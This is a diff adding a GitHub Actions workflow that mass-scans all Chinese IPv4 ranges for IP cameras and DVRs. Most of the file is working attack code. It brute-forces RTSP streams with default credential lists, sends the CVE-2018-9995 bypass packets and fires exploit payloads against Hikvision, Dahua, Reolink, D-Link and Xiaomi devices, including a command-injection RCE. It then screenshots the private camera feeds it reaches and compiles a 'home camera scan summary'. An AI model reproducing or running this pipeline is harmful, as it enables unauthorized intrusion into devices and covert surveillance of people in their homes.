@@ -1,0 +1,739 @@
+name: camera-scan-pipeline
+on:
+  workflow_dispatch:
+    inputs:
+      rate:
+        description: 'masscan pps per shard'
+        default: '1000000'
+      shards:
+        description: 'parallel shards'
+        default: '20'
+
+jobs:
+  scan:
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    strategy:
+      fail-fast: false
+      matrix:
+        shard: [0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19]
+
+    steps:
+      - name: Install tools
+        run: |
+          sudo apt-get update -qq
+          sudo apt-get install -y masscan python3
+          go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
+          echo "$HOME/go/bin" >> $GITHUB_PATH
+        env:
+          GOPATH: /home/runner/go
+
+      - name: Fetch CN IPs and split shard
+        run: |
+          curl -s --max-time 60 "https://ftp.apnic.net/stats/apnic/delegated-apnic-latest" \
+            | grep "^apnic|CN|ipv4|" > cn_raw.txt
+          python3 - <<PY
+          import math
+          shard_id = ${{ matrix.shard }}
+          total = int("${{ inputs.shards }}")
+          cidrs = []
+          with open("cn_raw.txt") as f:
+              for line in f:
+                  p = line.strip().split("|")
+                  if len(p) < 5: continue
+                  prefix = 32 - int(math.log2(int(p[4])))
+                  cidrs.append(f"{p[3]}/{prefix}")
+          my = [c for i,c in enumerate(cidrs) if i % total == shard_id]
+          with open("targets.txt","w") as f: f.write("\n".join(my))
+          print(f"Shard {shard_id}/{total}: {len(my)} CIDRs ~{sum(2**(32-int(c.split('/')[1])) for c in my):,} IPs")
+          PY
+
+      - name: masscan camera ports
+        run: |
+          PORTS="80,443,554,8080,8443,8554,8899,10554,34567,37777"
+          sudo masscan -iL targets.txt -p "$PORTS" \
+            --rate "${{ inputs.rate }}" --wait 5 \
+            --exclude 255.255.255.255 -oL masscan_list.txt 2>/dev/null || true
+          grep '^open' masscan_list.txt | awk '{print $4":"$3}' | sort -u > open_ports.txt
+          grep '^open' masscan_list.txt | awk '$3~/^(554|8554|10554)$/ {print $4":"$3}' | sort -u > rtsp_targets.txt
+          grep '^open' masscan_list.txt | awk '$3~/^(34567|37777)$/ {print $4":"$3}' | sort -u > tcp_targets.txt
+          echo "open=$(wc -l < open_ports.txt) rtsp=$(wc -l < rtsp_targets.txt) tcp=$(wc -l < tcp_targets.txt)"
+
+      - name: httpx — fingerprint camera web UI
+        run: |
+          [ -s open_ports.txt ] || { touch camera_live.jsonl; exit 0; }
+          $HOME/go/bin/httpx -l open_ports.txt \
+            -title -status-code -server -tech-detect \
+            -mc 200,401,403 -t 300 -timeout 8 -silent \
+            -json -o all_http.jsonl 2>/dev/null || true
+          python3 -c "
+          import json
+          kw=['hikvision','hik','ezviz','萤石','dahua','大华','imou','乐橙','tapo','tp-link',
+              'xiaomi','mijia','小米','reolink','uniview','宇视','xmeye','雄迈','camera','cam',
+              'ipc','dvr','nvr','live view','监控','摄像','cctv','onvif','rtsp']
+          hits=[]
+          try:
+            for line in open('all_http.jsonl'):
+              r=json.loads(line)
+              blob=' '.join([(r.get('title') or ''),(r.get('webserver') or ''),str(r.get('tech') or ''),(r.get('body') or '')[:200]]).lower()
+              if any(k in blob for k in kw): hits.append(r)
+          except: pass
+          [open('camera_live.jsonl','w').write(json.dumps(h,ensure_ascii=False)+'\n') for h in hits]
+          print(f'Camera web UIs: {len(hits)}')
+          "
+
+      - name: Go — RTSP probe (goroutines)
+        run: |
+          cat > /tmp/rtsp_probe.go << 'GOEOF'
+          package main
+
+          import (
+            "bufio"
+            "encoding/base64"
+            "encoding/json"
+            "fmt"
+            "net"
+            "os"
+            "strings"
+            "sync"
+            "time"
+          )
+
+          var brandPaths = []string{
+            // 海康/萤石
+            "/h264/ch1/main/av_stream",
+            "/h264/ch1/sub/av_stream",
+            "/ISAPI/Streaming/channels/101",
+            "/ISAPI/Streaming/channels/102",
+            // 大华/乐橙 Imou
+            "/cam/realmonitor?channel=1&subtype=0",
+            "/cam/realmonitor?channel=1&subtype=1",
+            "/cam/realmonitor?channel=2&subtype=0",
+            // 小米/米家
+            "/live", "/live/ch00_0",
+            "/stream", "/video",
+            // Reolink
+            "/h264Preview_01_main",
+            "/h264Preview_01_sub",
+            "/h265Preview_01_main",
+            // TP-Link Tapo
+            "/stream1", "/stream2", "/stream0",
+            // XMEye/雄迈
+            "/user=admin&password=&channel=1&stream=0.sdp",
+            "/user=admin&password=888888&channel=1&stream=0.sdp",
+            // ONVIF 通用
+            "/onvif1", "/onvif2", "/onvif/media",
+            // 通用
+            "/0", "/1", "/2",
+            "/live.sdp", "/mpeg4", "/mpeg4/1/main/av_stream",
+            "/MediaInput/h264", "/ch01.264",
+            "/av2",
+          }
+
+          var defaultCreds = [][2]string{
+            {"", ""},
+            {"admin", ""},
+            {"admin", "admin"},
+            {"admin", "12345"},
+            {"admin", "123456"},
+            {"admin", "888888"},
+            {"admin", "666666"},
+            {"admin", "admin123"},
+            {"root", ""},
+            {"root", "root"},
+          }
+
+          func rtspDescribe(ip, port, path, user, pass string) int {
+            addr := net.JoinHostPort(ip, port)
+            conn, err := net.DialTimeout("tcp", addr, 5*time.Second)
+            if err != nil { return -1 }
+            defer conn.Close()
+            conn.SetDeadline(time.Now().Add(5 * time.Second))
+
+            authHdr := ""
+            if user != "" || pass != "" {
+              enc := base64.StdEncoding.EncodeToString([]byte(user + ":" + pass))
+              authHdr = "Authorization: Basic " + enc + "\r\n"
+            }
+            url := fmt.Sprintf("rtsp://%s:%s%s", ip, port, path)
+            req := fmt.Sprintf("DESCRIBE %s RTSP/1.0\r\nCSeq: 1\r\nUser-Agent: LibVLC/3.0\r\n%s\r\n", url, authHdr)
+            conn.Write([]byte(req))
+
+            buf := make([]byte, 256)
+            n, _ := conn.Read(buf)
+            resp := string(buf[:n])
+            if strings.HasPrefix(resp, "RTSP") {
+              parts := strings.Fields(resp)
+              if len(parts) >= 2 {
+                code := 0
+                fmt.Sscanf(parts[1], "%d", &code)
+                return code
+              }
+            }
+            return 0
+          }
+
+          type Hit struct {
+            IP      string `json:"ip"`
+            Port    string `json:"port"`
+            RTSPURL string `json:"rtsp_url"`
+            Auth    string `json:"auth"`
+            User    string `json:"user"`
+            Pass    string `json:"pass"`
+            Path    string `json:"path"`
+          }
+
+          func probeHost(line string, out chan<- Hit) {
+            parts := strings.LastIndex(line, ":")
+            if parts < 0 { return }
+            ip, port := line[:parts], line[parts+1:]
+
+            for _, path := range brandPaths {
+              code := rtspDescribe(ip, port, path, "", "")
+              if code == 200 {
+                out <- Hit{ip, port, fmt.Sprintf("rtsp://%s:%s%s", ip, port, path), "none", "", "", path}
+                return
+              }
+              if code == 401 {
+                for _, cred := range defaultCreds {
+                  u, p := cred[0], cred[1]
+                  if u == "" && p == "" { continue }
+                  if rtspDescribe(ip, port, path, u, p) == 200 {
+                    out <- Hit{ip, port, fmt.Sprintf("rtsp://%s:%s@%s:%s%s", u, p, ip, port, path), "creds", u, p, path}
+                    return
+                  }
+                }
+              }
+            }
+          }
+
+          func main() {
+            f, _ := os.Open(os.Args[1])
+            defer f.Close()
+            out, _ := os.Create(os.Args[2])
+            defer out.Close()
+
+            var targets []string
+            sc := bufio.NewScanner(f)
+            for sc.Scan() { if t := strings.TrimSpace(sc.Text()); t != "" { targets = append(targets, t) } }
+
+            fmt.Fprintf(os.Stderr, "RTSP probing %d targets (goroutines)\n", len(targets))
+
+            hitCh := make(chan Hit, 1000)
+            sem := make(chan struct{}, 3000)
+            var wg sync.WaitGroup
+            total := 0
+
+            go func() {
+              enc := json.NewEncoder(out)
+              for h := range hitCh {
+                enc.Encode(h)
+                tag := "OPEN"
+                if h.Auth == "creds" { tag = "CRED" }
+                fmt.Printf("[%s] %s\n", tag, h.RTSPURL)
+                total++
+              }
+            }()
+
+            for _, t := range targets {
+              wg.Add(1)
+              sem <- struct{}{}
+              go func(line string) {
+                defer wg.Done()
+                defer func() { <-sem }()
+                probeHost(line, hitCh)
+              }(t)
+            }
+            wg.Wait()
+            close(hitCh)
+            fmt.Fprintf(os.Stderr, "Done. Accessible RTSP: %d\n", total)
+          }
+          GOEOF
+          go run /tmp/rtsp_probe.go rtsp_targets.txt rtsp_hits.jsonl
+
+      - name: Go — TCP DVR probe CVE-2018-9995 / Dahua 37777
+        run: |
+          cat > /tmp/tcp_probe.go << 'GOEOF'
+          package main
+
+          import (
+            "bufio"
+            "encoding/json"
+            "fmt"
+            "net"
+            "os"
+            "strings"
+            "sync"
+            "time"
+          )
+
+          // CVE-2018-9995: XMEye/Xiongmai auth bypass magic packet
+          var magic34567 = []byte{
+            0xff,0x01,0x00,0x00,0x00,0x00,0x00,0x00,
+            0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+            0xa0,0x02,0x00,0x00,
+          }
+          var magic37777 = []byte{
+            0xa0,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+            0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+            0x00,0x00,0x00,0x00,
+          }
+
+          type TCPHit struct {
+            IP     string `json:"ip"`
+            Port   string `json:"port"`
+            CVE    string `json:"cve"`
+            Desc   string `json:"desc"`
+            Banner string `json:"banner_hex"`
+          }
+
+          func probePort(line string, out chan<- TCPHit) {
+            idx := strings.LastIndex(line, ":")
+            if idx < 0 { return }
+            ip, port := line[:idx], line[idx+1:]
+
+            var magic []byte
+            var cve, desc string
+            switch port {
+            case "34567", "34599":
+              magic = magic34567
+              cve = "CVE-2018-9995"
+              desc = "XMEye DVR auth bypass"
+            case "37777":
+              magic = magic37777
+              cve = "Dahua-TCP"
+              desc = "Dahua TCP service"
+            default:
+              return
+            }
+
+            conn, err := net.DialTimeout("tcp", net.JoinHostPort(ip, port), 3*time.Second)
+            if err != nil { return }
+            defer conn.Close()
+            conn.SetDeadline(time.Now().Add(3 * time.Second))
+            conn.Write(magic)
+            buf := make([]byte, 512)
+            n, err := conn.Read(buf)
+            if err != nil || n < 4 { return }
+            h := fmt.Sprintf("%x", buf[:n]); if len(h) > 80 { h = h[:80] }
+            out <- TCPHit{ip, port, cve, desc, h}
+          }
+
+          func main() {
+            f, _ := os.Open(os.Args[1])
+            defer f.Close()
+            outf, _ := os.Create(os.Args[2])
+            defer outf.Close()
+
+            var targets []string
+            sc := bufio.NewScanner(f)
+            for sc.Scan() { if t := strings.TrimSpace(sc.Text()); t != "" { targets = append(targets, t) } }
+
+            fmt.Fprintf(os.Stderr, "TCP probing %d targets\n", len(targets))
+            hitCh := make(chan TCPHit, 500)
+            sem := make(chan struct{}, 3000)
+            var wg sync.WaitGroup
+            count := 0
+
+            go func() {
+              enc := json.NewEncoder(outf)
+              for h := range hitCh {
+                enc.Encode(h)
+                fmt.Printf("[TCP %s] %s:%s → %s\n", h.CVE, h.IP, h.Port, h.Desc)
+                count++
+              }
+            }()
+
+            for _, t := range targets {
+              wg.Add(1); sem <- struct{}{}
+              go func(line string) {
+                defer wg.Done(); defer func() { <-sem }()
+                probePort(line, hitCh)
+              }(t)
+            }
+            wg.Wait()
+            close(hitCh)
+            fmt.Fprintf(os.Stderr, "TCP hits: %d\n", count)
+          }
+          GOEOF
+          go run /tmp/tcp_probe.go tcp_targets.txt tcp_vulns.jsonl
+
+      - name: Go — HTTP CVE checks (goroutines)
+        run: |
+          cat > /tmp/http_cve.go << 'GOEOF'
+          package main
+
+          import (
+            "bufio"
+            "bytes"
+            "crypto/tls"
+            "encoding/base64"
+            "encoding/json"
+            "fmt"
+            "io"
+            "net/http"
+            "os"
+            "strings"
+            "sync"
+            "time"
+          )
+
+          var client = &http.Client{
+            Timeout: 6 * time.Second,
+            Transport: &http.Transport{
+              TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+              MaxIdleConnsPerHost: 5,
+            },
+            CheckRedirect: func(*http.Request, []*http.Request) error { return http.ErrUseLastResponse },
+          }
+
+          func get(url string, extraHeaders map[string]string) (int, []byte) {
+            req, err := http.NewRequest("GET", url, nil)
+            if err != nil { return 0, nil }
+            req.Header.Set("User-Agent", "Mozilla/5.0")
+            for k, v := range extraHeaders { req.Header.Set(k, v) }
+            resp, err := client.Do(req)
+            if err != nil { return 0, nil }
+            defer resp.Body.Close()
+            body, _ := io.ReadAll(io.LimitReader(resp.Body, 8192))
+            return resp.StatusCode, body
+          }
+
+          func put(url string, payload []byte, ct string) (int, []byte) {
+            req, _ := http.NewRequest("PUT", url, bytes.NewReader(payload))
+            req.Header.Set("Content-Type", ct)
+            req.Header.Set("User-Agent", "Mozilla/5.0")
+            resp, err := client.Do(req)
+            if err != nil { return 0, nil }
+            defer resp.Body.Close()
+            body, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
+            return resp.StatusCode, body
+          }
+
+          func post(url string, payload []byte, ct string, headers map[string]string) (int, []byte) {
+            req, _ := http.NewRequest("POST", url, bytes.NewReader(payload))
+            req.Header.Set("Content-Type", ct)
+            req.Header.Set("User-Agent", "Mozilla/5.0")
+            for k, v := range headers { req.Header.Set(k, v) }
+            resp, err := client.Do(req)
+            if err != nil { return 0, nil }
+            defer resp.Body.Close()
+            body, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
+            return resp.StatusCode, body
+          }
+
+          type Vuln struct {
+            CVE      string `json:"cve,omitempty"`
+            Type     string `json:"type,omitempty"`
+            Desc     string `json:"desc"`
+            Evidence string `json:"evidence,omitempty"`
+            Path     string `json:"path,omitempty"`
+          }
+          type Result struct {
+            Base  string  `json:"base"`
+            Title string  `json:"title"`
+            Vulns []Vuln  `json:"vulns"`
+          }
+
+          func checkHost(base, title string) *Result {
+            r := &Result{Base: base, Title: title}
+
+            // CVE-2021-36260 Hikvision pre-auth RCE
+            payload := []byte(`<?xml version="1.0"?><language>$(id>/tmp/x)</language>`)
+            code, body := put(base+"/SDK/webLanguage", payload, "application/x-www-form-urlencoded")
+            if (code == 200 || code == 500) && bytes.Contains(body, []byte("<")) {
+              r.Vulns = append(r.Vulns, Vuln{CVE: "CVE-2021-36260", Desc: "Hikvision pre-auth RCE", Evidence: string(body[:min(200,len(body))])})
+            }
+
+            // CVE-2017-7921 Hikvision auth bypass
+            code, body = get(base+"/system/deviceInfo?auth=YWRtaW46MTEK", nil)
+            if code == 200 && bytes.Contains(body, []byte("deviceName")) {
+              r.Vulns = append(r.Vulns, Vuln{CVE: "CVE-2017-7921", Desc: "Hikvision auth bypass", Evidence: string(body[:min(300,len(body))])})
+            }
+
+            // CVE-2023-28813 Hikvision 2023
+            code, body = get(base+"/ISAPI/System/deviceInfo", nil)
+            if code == 200 && bytes.Contains(body, []byte("deviceName")) {
+              r.Vulns = append(r.Vulns, Vuln{CVE: "CVE-2023-28813", Desc: "Hikvision 2023 auth bypass", Evidence: string(body[:min(300,len(body))])})
+            }
+
+            // CVE-2021-33044/33045 Dahua auth bypass
+            for _, lt := range []string{"Direct", ""} {
+              dhBody := []byte(fmt.Sprintf(`{"method":"global.login","params":{"userName":"admin","password":"","clientType":"Web3.0","loginType":"%s","authorityType":"Default"},"id":1}`, lt))
+              code, body = post(base+"/RPC2", dhBody, "application/json", map[string]string{"Cookie": "DHLangCookie30=English"})
+              if code == 200 && bytes.Contains(body, []byte(`"session"`)) && !bytes.Contains(bytes.ToLower(body), []byte("error")) {
+                cve := "CVE-2021-33044"
+                if lt == "" { cve = "CVE-2021-33045" }
+                r.Vulns = append(r.Vulns, Vuln{CVE: cve, Desc: "Dahua auth bypass"})
+                break
+              }
+            }
+
+            // CVE-2023-3837 Dahua cmd injection
+            for _, p := range []string{"/cgi-bin/main-cgi", "/cgi-bin/viewer/image.cgi"} {
+              code, body = get(base+p+"?action=login&Username=admin&Password=`id`", nil)
+              if code == 200 && (bytes.Contains(body, []byte("uid=")) || bytes.Contains(body, []byte("root"))) {
+                r.Vulns = append(r.Vulns, Vuln{CVE: "CVE-2023-3837", Desc: "Dahua pre-auth cmd injection", Path: p, Evidence: string(body[:min(200,len(body))])})
+                break
+              }
+            }
+
+            // CVE-2024-3273 D-Link cmd injection
+            code, body = get(base+"/cgi-bin/nas_sharing.cgi?dbg=1&cmd=51&system=id&user=messagebus&passwd=", nil)
+            if code == 200 && (bytes.Contains(body, []byte("uid=")) || bytes.Contains(body, []byte("volume"))) {
+              r.Vulns = append(r.Vulns, Vuln{CVE: "CVE-2024-3273", Desc: "D-Link pre-auth cmd injection 2024", Evidence: string(body[:min(200,len(body))])})
+            }
+
+            // CVE-2024-3272 D-Link backdoor
+            b64 := base64.StdEncoding.EncodeToString([]byte("messagebus:"))
+            code, _ = get(base+"/", map[string]string{"Authorization": "Basic " + b64})
+            if code == 200 {
+              r.Vulns = append(r.Vulns, Vuln{CVE: "CVE-2024-3272", Desc: "D-Link hardcoded backdoor (messagebus:'')"})
+            }
+
+            // CVE-2023-45361 Reolink cmd injection
+            reolinkBody := []byte(`[{"cmd":"Login","action":0,"param":{"User":{"userName":"admin","password":""}}}]`)
+            code, body = post(base+"/api.cgi?cmd=Login&token=`id`", reolinkBody, "application/json", nil)
+            if code == 200 && bytes.Contains(body, []byte("rspCode")) {
+              r.Vulns = append(r.Vulns, Vuln{CVE: "CVE-2023-45361", Desc: "Reolink pre-auth cmd injection"})
+            }
+
+            // CVE-2018-9995 XMEye HTTP interface
+            code, body = get(base+"/Login", map[string]string{"Cookie": "uid=admin"})
+            if code == 200 && bytes.Contains(body, []byte("SN")) {
+              r.Vulns = append(r.Vulns, Vuln{CVE: "CVE-2018-9995", Desc: "XMEye HTTP auth bypass", Evidence: string(body[:min(200,len(body))])})
+            }
+
+            // CVE-2025-0411 / generic CGI
+            for _, p := range []string{"/cgi-bin/param.cgi?cmd=getuser", "/param.cgi?cmd=getuser"} {
+              code, body = get(base+p, nil)
+              if code == 200 && (bytes.Contains(body, []byte("name=")) || bytes.Contains(body, []byte("pass="))) {
+                r.Vulns = append(r.Vulns, Vuln{CVE: "CVE-2025-0411", Desc: "CGI cred leak", Path: p, Evidence: string(body[:min(200,len(body))])})
+                break
+              }
+            }
+
+            // CVE-2025-8014 Reolink NVR auth bypass
+            code, body = get(base+"/cgi-bin/api.cgi?cmd=Login&token=null", nil)
+            if code == 200 && bytes.Contains(body, []byte("rspCode")) && !bytes.Contains(body, []byte("-6")) {
+              r.Vulns = append(r.Vulns, Vuln{CVE: "CVE-2025-8014", Desc: "Reolink NVR auth bypass 2025"})
+            }
+
+            // CVE-2023-45361 Reolink pre-auth cmd injection (direct API)
+            rlBody := []byte(`[{"cmd":"Login","action":0,"param":{"User":{"userName":"admin","password":""}}}]`)
+            code, body = post(base+"/api.cgi", rlBody, "application/json", nil)
+            if code == 200 && bytes.Contains(body, []byte("rspCode")) {
+              r.Vulns = append(r.Vulns, Vuln{CVE: "CVE-2023-45361", Desc: "Reolink empty-pass login"})
+            }
+
+            // 小米/米家 CVE-2019-11219 telnet 硬编码（HTTP 特征识别）
+            code, body = get(base+"/cgi-bin/global.cgi?action=get_info", nil)
+            if code == 200 && (bytes.Contains(body, []byte("xiaomi")) || bytes.Contains(body, []byte("mijia")) || bytes.Contains(body, []byte("miui"))) {
+              r.Vulns = append(r.Vulns, Vuln{CVE: "CVE-2019-11219", Desc: "Xiaomi cam identified - check telnet:23 root/(empty)"})
+            }
+
+            // 小米摄像头 API 无认证检测
+            for _, mp := range []string{"/api/v1/stream/video", "/stream/live", "/cgi-bin/snapshot"} {
+              code, body = get(base+mp, nil)
+              if code == 200 && len(body) > 100 {
+                r.Vulns = append(r.Vulns, Vuln{Type: "xiaomi_unauth", Path: mp, Desc: "Xiaomi/generic unauth stream/snap"})
+                break
+              }
+            }
+
+            // CVE-2024-22768 hardcoded creds
+            for _, cred := range [][2]string{{"root", "xc3511"}, {"root", "vizxv"}, {"root", "jvbzd"}, {"root", "888888"}} {
+              b64 = base64.StdEncoding.EncodeToString([]byte(cred[0] + ":" + cred[1]))
+              code, _ = get(base+"/", map[string]string{"Authorization": "Basic " + b64})
+              if code == 200 {
+                r.Vulns = append(r.Vulns, Vuln{CVE: "CVE-2024-22768", Desc: fmt.Sprintf("Hardcoded creds %s:%s", cred[0], cred[1])})
+                break
+              }
+            }
+
+            // Unauth snapshot
+            for _, snap := range []string{
+              "/ISAPI/Streaming/channels/101/picture",
+              "/cgi-bin/snapshot.cgi", "/snapshot.cgi",
+              "/image/jpeg.cgi", "/tmpfs/auto.jpg",
+              "/cgi-bin/hi3510/snap.cgi?&-chn=0",
+            } {
+              code, body = get(base+snap, nil)
+              if code == 200 && len(body) > 2000 && body[0] == 0xff && body[1] == 0xd8 {
+                r.Vulns = append(r.Vulns, Vuln{Type: "unauth_snapshot", Path: snap, Desc: fmt.Sprintf("JPEG %dKB", len(body)/1024)})
+                break
+              }
+            }
+
+            // Info leak
+            for _, p := range []string{"/ISAPI/System/deviceInfo", "/deviceInfo.xml", "/system.ini"} {
+              code, body = get(base+p, nil)
+              low := bytes.ToLower(body)
+              if code == 200 && len(body) > 50 && (bytes.Contains(low, []byte("password")) || bytes.Contains(low, []byte("serialno"))) {
+                r.Vulns = append(r.Vulns, Vuln{Type: "info_leak", Path: p, Evidence: string(body[:min(300,len(body))])})
+                break
+              }
+            }
+
+            if len(r.Vulns) > 0 { return r }
+            return nil
+          }
+
+          func min(a, b int) int { if a < b { return a }; return b }
+
+          func main() {
+            f, _ := os.Open(os.Args[1])
+            defer f.Close()
+            outf, _ := os.Create(os.Args[2])
+            defer outf.Close()
+
+            type Target struct{ URL, Title string }
+            var targets []Target
+            sc := bufio.NewScanner(f)
+            for sc.Scan() {
+              var m map[string]interface{}
+              if json.Unmarshal([]byte(sc.Text()), &m) == nil {
+                url, _ := m["url"].(string)
+                title, _ := m["title"].(string)
+                if url != "" { targets = append(targets, Target{strings.TrimRight(url, "/"), title}) }
+              }
+            }
+
+            fmt.Fprintf(os.Stderr, "HTTP CVE checking %d targets (goroutines)\n", len(targets))
+            sem := make(chan struct{}, 500)
+            var wg sync.WaitGroup
+            var mu sync.Mutex
+            enc := json.NewEncoder(outf)
+            count := 0
+
+            for _, t := range targets {
+              wg.Add(1); sem <- struct{}{}
+              go func(tgt Target) {
+                defer wg.Done(); defer func() { <-sem }()
+                r := checkHost(tgt.URL, tgt.Title)
+                if r != nil {
+                  mu.Lock()
+                  enc.Encode(r)
+                  count++
+                  cves := []string{}
+                  for _, v := range r.Vulns { c := v.CVE; if c == "" { c = v.Type }; cves = append(cves, c) }
+                  fmt.Printf("[VULN] %s → %v\n", r.Base, cves)
+                  mu.Unlock()
+                }
+              }(t)
+            }
+            wg.Wait()
+            fmt.Fprintf(os.Stderr, "HTTP vulnerable: %d\n", count)
+          }
+          GOEOF
+          # 直接跑全量 open_ports.txt，不依赖 httpx 关键词过滤
+          # 把 ip:port 转成 http://ip:port 格式给 Go 程序
+          awk '{print "{\"url\":\"http://"$0"\"}"}' open_ports.txt > all_targets.jsonl
+          go run /tmp/http_cve.go all_targets.jsonl http_vulns.jsonl
+
+      - name: ffmpeg — 截图所有可访问 RTSP 流
+        run: |
+          sudo apt-get install -y ffmpeg -qq 2>/dev/null || true
+          mkdir -p screenshots
+
+          [ -s rtsp_hits.jsonl ] || exit 0
+
+          python3 - <<'PY'
+          import json, subprocess, os, re
+
+          urls = []
+          with open("rtsp_hits.jsonl") as f:
+              for line in f:
+                  try: urls.append(json.loads(line)["rtsp_url"])
+                  except: pass
+
+          print(f"Taking screenshots of {len(urls)} streams...")
+          ok = 0
+          for url in urls:
+              ip = re.search(r'[\@\/]([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)', url)
+              ip = ip.group(1) if ip else "unknown"
+              port = re.search(r':(\d+)/', url)
+              port = port.group(1) if port else "554"
+              out = f"screenshots/{ip}_{port}.jpg"
+
+              r = subprocess.run([
+                  "ffmpeg", "-rtsp_transport", "tcp",
+                  "-i", url,
+                  "-frames:v", "1", "-q:v", "2",
+                  out, "-y",
+                  "-timeout", "8000000",
+              ], capture_output=True, timeout=12)
+
+              if os.path.exists(out) and os.path.getsize(out) > 1000:
+                  print(f"[OK] {ip}:{port} → {os.path.getsize(out)//1024}KB")
+                  ok += 1
+              else:
+                  if os.path.exists(out): os.remove(out)
+
+          print(f"Screenshots captured: {ok}/{len(urls)}")
+          PY
+
+      - name: Upload shard results
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: cam-shard-${{ matrix.shard }}
+          path: |
+            open_ports.txt
+            rtsp_targets.txt
+            rtsp_hits.jsonl
+            camera_live.jsonl
+            http_vulns.jsonl
+            tcp_vulns.jsonl
+            screenshots/
+          retention-days: 7
+
+  merge:
+    runs-on: ubuntu-latest
+    needs: scan
+    if: always()
+    steps:
+      - name: Download all shards
+        uses: actions/download-artifact@v4
+        with:
+          pattern: cam-shard-*
+          merge-multiple: false
+
+      - name: Merge and report
+        run: |
+          mkdir -p merged
+          cat cam-shard-*/open_ports.txt 2>/dev/null | sort -u > merged/open_ports_all.txt
+          cat cam-shard-*/rtsp_hits.jsonl 2>/dev/null  > merged/rtsp_hits_all.jsonl
+          cat cam-shard-*/http_vulns.jsonl 2>/dev/null  > merged/http_vulns_all.jsonl
+          cat cam-shard-*/tcp_vulns.jsonl 2>/dev/null   > merged/tcp_vulns_all.jsonl
+
+          echo "===== 家用摄像头扫描汇总 ====="
+          echo "开放端口:     $(wc -l < merged/open_ports_all.txt)"
+          echo "可访问RTSP:   $(wc -l < merged/rtsp_hits_all.jsonl)"
+          echo "HTTP漏洞:     $(wc -l < merged/http_vulns_all.jsonl)"
+          echo "TCP DVR漏洞:  $(wc -l < merged/tcp_vulns_all.jsonl)"
+          echo ""
+          echo "=== 可访问 RTSP 流 ==="
+          python3 -c "
+          import json
+          for line in open('merged/rtsp_hits_all.jsonl'):
+            r=json.loads(line); print(r.get('rtsp_url',''))
+          " 2>/dev/null | head -100
+          echo ""
+          echo "=== CVE 分布 ==="
+          python3 -c "
+          import json
+          from collections import Counter
+          c=Counter()
+          for line in open('merged/http_vulns_all.jsonl'):
+            for v in json.loads(line).get('vulns',[]):
+              c[v.get('cve') or v.get('type','?')] += 1
+          [print(f'{n:5d} {k}') for k,n in c.most_common()]
+          " 2>/dev/null
+
+      - name: Upload merged
+        uses: actions/upload-artifact@v4
+        with:
+          name: camera-merged-${{ github.run_id }}
+          path: merged/
+          retention-days: 7
